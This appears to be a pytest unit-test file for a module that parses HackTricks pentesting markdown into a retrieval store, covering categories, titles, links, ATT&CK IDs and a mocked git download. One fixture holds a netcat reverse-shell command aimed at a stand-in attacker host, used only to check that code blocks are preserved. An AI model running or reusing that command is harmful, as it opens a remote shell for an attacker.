"""Unit tests for HackTricks source integration.

Story 6.7: HackTricks Source Integration

Tests for parsing and metadata extraction without network access.
"""
import pytest
import subprocess
from datetime import datetime
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, AsyncMock
from cyberred.rag.sources.hacktricks import (
    _extract_category_from_path,
    _extract_title_from_markdown,
    _extract_links_from_markdown,
    _parse_markdown_file,
    _parse_all_markdown_files,
    _extract_technique_ids,
    _download_hacktricks,
    _git_sparse_checkout,
    validate_technique_id,
)


class TestCategoryExtraction:
    """Test category extraction from directory paths (AC: 5)."""
    
    def test_pentesting_web_category(self):
        """Test web pentesting category detection."""
        path = Path("pentesting-web/sql-injection/README.md")
        assert _extract_category_from_path(path) == "web"
    
    def test_cloud_security_category(self):
        """Test cloud security category detection."""
        path = Path("cloud-security/aws/README.md")
        assert _extract_category_from_path(path) == "cloud"
    
    def test_mobile_pentesting_category(self):
        """Test mobile pentesting category detection."""
        path = Path("mobile-pentesting/android/README.md")
        assert _extract_category_from_path(path) == "mobile"
    
    def test_linux_hardening_category(self):
        """Test linux category detection."""
        path = Path("linux-hardening/privilege-escalation/README.md")
        assert _extract_category_from_path(path) == "linux"
    
    def test_windows_hardening_category(self):
        """Test windows category detection."""
        path = Path("windows-hardening/active-directory/README.md")
        assert _extract_category_from_path(path) == "windows"
    
    def test_network_services_category(self):
        """Test network services category detection."""
        path = Path("network-services-pentesting/pentesting-smb.md")
        assert _extract_category_from_path(path) == "network"
    
    def test_generic_methodologies_category(self):
        """Test methodology category detection."""
        path = Path("generic-methodologies-and-resources/pentesting-methodology/README.md")
        assert _extract_category_from_path(path) == "methodology"
    
    def test_forensics_category(self):
        """Test forensics category detection."""
        path = Path("forensics/basic-forensic-methodology/README.md")
        assert _extract_category_from_path(path) == "forensics"
    
    def test_crypto_category(self):
        """Test crypto category detection."""
        path = Path("crypto-and-stego/crypto-ctfs-tricks.md")
        assert _extract_category_from_path(path) == "crypto"
    
    def test_reversing_category(self):
        """Test reversing category detection."""
        path = Path("reversing/reversing-tools-basic-methods/README.md")
        assert _extract_category_from_path(path) == "reversing"
    
    def test_exploiting_category(self):
        """Test exploitation category detection."""
        path = Path("exploiting/linux-exploiting-basic-esp/README.md")
        assert _extract_category_from_path(path) == "exploitation"
    
    def test_unknown_directory_general_category(self):
        """Test fallback to general category for unknown directories."""
        path = Path("unknown-dir/some-file.md")
        assert _extract_category_from_path(path) == "general"
    
    def test_root_level_file(self):
        """Test root level file gets general category."""
        path = Path("README.md")
        assert _extract_category_from_path(path) == "general"


class TestTitleExtraction:
    """Test title extraction from markdown content (AC: 4)."""
    
    def test_h1_header_extraction(self):
        """Test extracting title from # header."""
        markdown = "# SQL Injection Basics\n\nContent here..."
        assert _extract_title_from_markdown(markdown, Path("test.md")) == "SQL Injection Basics"
    
    def test_h1_with_leading_whitespace(self):
        """Test extracting title with whitespace."""
        markdown = "#   Privilege Escalation   \n\nContent..."
        assert _extract_title_from_markdown(markdown, Path("test.md")) == "Privilege Escalation"
    
    def test_no_header_uses_filename(self):
        """Test fallback to filename when no header found."""
        markdown = "Just content without headers"
        result = _extract_title_from_markdown(markdown, Path("sql-injection.md"))
        assert result == "sql-injection"
    
    def test_multiple_headers_uses_first(self):
        """Test that first h1 header is used."""
        markdown = "# First Title\n\nSome content\n\n# Second Title"
        assert _extract_title_from_markdown(markdown, Path("test.md")) == "First Title"
    
    def test_empty_markdown_uses_filename(self):
        """Test empty markdown falls back to filename."""
        markdown = ""
        result = _extract_title_from_markdown(markdown, Path("empty.md"))
        assert result == "empty"
    
    def test_h1_header_empty_after_strip_uses_filename(self):
        """Test that H1 header with only whitespace falls back to filename."""
        # This tests the branch where `if title:` is False (empty after strip)
        # and continues to check the next line
        markdown = "#    \n# Real Title"
        result = _extract_title_from_markdown(markdown, Path("fallback.md"))
        # Should skip empty H1 and find the real title
        assert result == "Real Title"
    
    def test_h1_header_all_empty_uses_filename(self):
        """Test that all empty H1 headers fall back to filename."""
        markdown = "#    \n#   \nSome content"
        result = _extract_title_from_markdown(markdown, Path("fallback.md"))
        assert result == "fallback"


class TestLinkExtraction:
    """Test external link extraction (AC: 6)."""
    
    def test_extract_http_links(self):
        """Test extraction of HTTP links."""
        markdown = "Check [this](https://example.com) and [that](http://test.com)"
        links = _extract_links_from_markdown(markdown)
        assert "https://example.com" in links
        assert "http://test.com" in links
    
    def test_extract_embedded_urls(self):
        """Test extraction of GitBook embed URLs."""
        markdown = '{% embed url="https://github.com/test" %}'
        links = _extract_links_from_markdown(markdown)
        assert "https://github.com/test" in links
    
    def test_no_duplicate_links(self):
        """Test that duplicate links are deduplicated."""
        markdown = "[link1](https://example.com) and [link2](https://example.com)"
        links = _extract_links_from_markdown(markdown)
        assert len([l for l in links if l == "https://example.com"]) == 1
    
    def test_no_internal_links(self):
        """Test that internal/relative links are excluded."""
        markdown = "[internal](./local.md) [external](https://example.com)"
        links = _extract_links_from_markdown(markdown)
        assert "./local.md" not in links
        assert "https://example.com" in links
    
    def test_empty_markdown_returns_empty_list(self):
        """Test empty markdown returns no links."""
        links = _extract_links_from_markdown("")
        assert links == []


class TestTechniqueIdExtraction:
    """Test ATT&CK technique ID extraction (AC: 5, optional metadata)."""
    
    def test_extract_single_technique_id(self):
        """Test extraction of single technique ID."""
        content = "This uses technique T1055 for process injection."
        ids = _extract_technique_ids(content)
        assert "T1055" in ids
    
    def test_extract_sub_technique_id(self):
        """Test extraction of sub-technique ID."""
        content = "Using T1059.001 (PowerShell) for execution."
        ids = _extract_technique_ids(content)
        assert "T1059.001" in ids
    
    def test_extract_multiple_technique_ids(self):
        """Test extraction of multiple technique IDs."""
        content = "Combines T1055 and T1003.001 for credential access."
        ids = _extract_technique_ids(content)
        assert "T1055" in ids
        assert "T1003.001" in ids
    
    def test_no_duplicates(self):
        """Test that duplicate IDs are removed."""
        content = "T1055 is used. Later, T1055 is mentioned again."
        ids = _extract_technique_ids(content)
        assert len([i for i in ids if i == "T1055"]) == 1
    
    def test_validate_technique_id_valid(self):
        """Test validation of valid technique IDs."""
        assert validate_technique_id("T1055")
        assert validate_technique_id("T1059.001")
    
    def test_validate_technique_id_invalid(self):
        """Test validation rejects invalid technique IDs."""
        assert not validate_technique_id("T123")  # Too short
        assert not validate_technique_id("T12345")  # Too long
        assert not validate_technique_id("1055")  # No T prefix
        assert not validate_technique_id("")  # Empty
        assert not validate_technique_id("T1055.1")  # Sub-technique wrong format


class TestMarkdownParsing:
    """Test full markdown file parsing (AC: 4, 5, 6, 7)."""
    
    def test_parse_basic_markdown_file(self):
        """Test parsing a basic markdown file."""
        content = """# SQL Injection
        
This is a guide to SQL injection attacks.

Visit [OWASP](https://owasp.org) for more info.

Technique T1190 is used here.
"""
        path = Path("pentesting-web/sql-injection.md")
        doc = _parse_markdown_file(content, path)
        
        assert doc["metadata"]["id"] == "pentesting-web/sql-injection.md"
        assert doc["metadata"]["title"] == "SQL Injection"
        assert doc["metadata"]["category"] == "web"
        assert doc["metadata"]["path"] == "pentesting-web/sql-injection.md"
        assert "links" in doc["metadata"]
        assert "https://owasp.org" in doc["metadata"]["links"]
        assert "technique_ids" in doc["metadata"]
        assert "T1190" in doc["metadata"]["technique_ids"]
    
    def test_parse_with_gitbook_hints(self):
        """Test parsing markdown with GitBook hint blocks."""
        content = """# Linux Privilege Escalation

{% hint style="info" %}
This is an important note.
{% endhint %}

Some content here.
"""
        path = Path("linux-hardening/privilege-escalation/README.md")
        doc = _parse_markdown_file(content, path)
        
        # Hints should be treated as text and included
        assert "This is an important note" in doc["text"]
        assert doc["metadata"]["category"] == "linux"
    
    def test_parse_with_code_blocks(self):
        """Test parsing preserves code blocks (AC: 7)."""
        content = """# Command Injection

Example:
```bash
nc -e /bin/sh attacker.com 4444
```

More content.
"""
        path = Path("pentesting-web/command-injection.md")
        doc = _parse_markdown_file(content, path)
        
        # Code block should be preserved in text
        assert "nc -e /bin/sh" in doc["text"]
        assert "```bash" in doc["text"] or "bash" in doc["text"]
    
    def test_parse_empty_file_returns_none(self):
        """Test that empty files return None (graceful skip)."""
        content = ""
        path = Path("empty.md")
        doc = _parse_markdown_file(content, path)
        
        # Should return None or skip gracefully
        assert doc is None or doc["text"].strip() == ""
    
    def test_parse_malformed_markdown_graceful(self):
        """Test that malformed markdown is handled gracefully."""
        content = "# Incomplete header\n\n{% hint"  # Unclosed hint block
        path = Path("malformed.md")
        
        # Should not raise exception
        doc = _parse_markdown_file(content, path)
        assert doc is not None
        assert doc["metadata"]["title"] == "Incomplete header"
    
    def test_document_text_format(self):
        """Test document text follows template format (AC: 4)."""
        content = "# Test Title\n\nContent here."
        path = Path("test-dir/test.md")
        doc = _parse_markdown_file(content, path)
        
        # Text should follow template format
        text = doc["text"]
        assert "# Test Title" in text
        assert "Category:" in text
        assert "Path:" in text
    
    def test_last_modified_metadata(self):
        """Test last_modified metadata is included (AC: 5)."""
        content = "# Test Title\n\nContent here."
        path = Path("test-dir/test.md")
        test_time = datetime(2026, 1, 10, 12, 0, 0)
        
        doc = _parse_markdown_file(content, path, last_modified=test_time)
        
        assert "last_modified" in doc["metadata"]
        assert doc["metadata"]["last_modified"] == "2026-01-10T12:00:00"
    
    def test_last_modified_none_when_not_provided(self):
        """Test last_modified is None when not provided."""
        content = "# Test Title\n\nContent here."
        path = Path("test-dir/test.md")
        
        doc = _parse_markdown_file(content, path)
        
        assert "last_modified" in doc["metadata"]
        assert doc["metadata"]["last_modified"] is None


class TestParseAllMarkdownFiles:
    """Test _parse_all_markdown_files function for edge cases."""
    
    def test_oserror_on_stat_returns_none_last_modified(self, tmp_path):
        """Test that OSError on file stat results in None last_modified."""
        # Create a test file
        test_file = tmp_path / "test.md"
        test_file.write_text("# Test\n\nContent")
        
        with patch.object(Path, 'stat', side_effect=OSError("Permission denied")):
            docs = _parse_all_markdown_files([test_file], tmp_path)
        
        assert len(docs) == 1
        assert docs[0]["metadata"]["last_modified"] is None
    
    def test_exception_during_parsing_skips_file(self, tmp_path):
        """Test that exceptions during file parsing are handled gracefully."""
        # Create a test file
        test_file = tmp_path / "test.md"
        test_file.write_text("# Test\n\nContent")
        
        with patch.object(Path, 'read_text', side_effect=Exception("Read error")):
            docs = _parse_all_markdown_files([test_file], tmp_path)
        
        # File should be skipped
        assert len(docs) == 0
    
    def test_empty_file_skipped(self, tmp_path):
        """Test that empty files are skipped."""
        test_file = tmp_path / "empty.md"
        test_file.write_text("")
        
        docs = _parse_all_markdown_files([test_file], tmp_path)
        
        assert len(docs) == 0


class TestDownloadHacktricks:
    """Test _download_hacktricks async function."""
    
    @pytest.mark.asyncio
    async def test_cache_hit_returns_existing_dir(self, tmp_path):
        """Test that existing cache directory is returned without download."""
        cache_dir = tmp_path / "cache"
        repo_dir = cache_dir / "hacktricks"
        repo_dir.mkdir(parents=True)
        
        result = await _download_hacktricks(cache_dir, force_refresh=False)
        
        assert result == repo_dir
    
    @pytest.mark.asyncio
    async def test_force_refresh_removes_existing(self, tmp_path):
        """Test that force_refresh removes existing cache."""
        cache_dir = tmp_path / "cache"
        repo_dir = cache_dir / "hacktricks"
        repo_dir.mkdir(parents=True)
        marker_file = repo_dir / "marker.txt"
        marker_file.write_text("exists")
        
        with patch('cyberred.rag.sources.hacktricks._git_sparse_checkout') as mock_git:
            await _download_hacktricks(cache_dir, force_refresh=True)
            
            # Should have called git checkout
            mock_git.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_git_failure_raises_runtime_error(self, tmp_path):
        """Test that git clone failure raises RuntimeError."""
        cache_dir = tmp_path / "cache"
        
        error = subprocess.CalledProcessError(1, "git", stderr=b"clone failed")
        with patch('cyberred.rag.sources.hacktricks._git_sparse_checkout', side_effect=error):
            with pytest.raises(RuntimeError, match="Failed to clone HackTricks"):
                await _download_hacktricks(cache_dir, force_refresh=False)
    
    @pytest.mark.asyncio
    async def test_new_download_creates_directory(self, tmp_path):
        """Test that new download creates cache directory."""
        cache_dir = tmp_path / "new_cache"
        
        with patch('cyberred.rag.sources.hacktricks._git_sparse_checkout'):
            result = await _download_hacktricks(cache_dir, force_refresh=False)
            
            assert cache_dir.exists()
            assert result == cache_dir / "hacktricks"


class TestGitSparseCheckout:
    """Test _git_sparse_checkout function."""
    
    def test_git_commands_executed(self, tmp_path):
        """Test that git clone and sparse-checkout commands are executed."""
        repo_dir = tmp_path / "repo"
        
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=b"", stderr=b"")
            
            _git_sparse_checkout(repo_dir)
            
            # Should have called subprocess.run twice (clone + sparse-checkout)
            assert mock_run.call_count == 2
            
            # First call should be git clone
            clone_call = mock_run.call_args_list[0]
            assert "clone" in clone_call[0][0]
            assert "--sparse" in clone_call[0][0]
            assert "--filter=blob:none" in clone_call[0][0]
            
            # Second call should be sparse-checkout set
            sparse_call = mock_run.call_args_list[1]
            assert "sparse-checkout" in sparse_call[0][0]
            assert "set" in sparse_call[0][0]
    
    def test_git_clone_failure_raises(self, tmp_path):
        """Test that git clone failure propagates CalledProcessError."""
        repo_dir = tmp_path / "repo"
        
        with patch('subprocess.run', side_effect=subprocess.CalledProcessError(1, "git")):
            with pytest.raises(subprocess.CalledProcessError):
                _git_sparse_checkout(repo_dir)


class TestCategoryExtractionEdgeCases:
    """Additional edge case tests for category extraction."""
    
    def test_empty_path_returns_general(self):
        """Test that empty path returns general category."""
        # Path with no parts
        path = Path("")
        assert _extract_category_from_path(path) == "general"
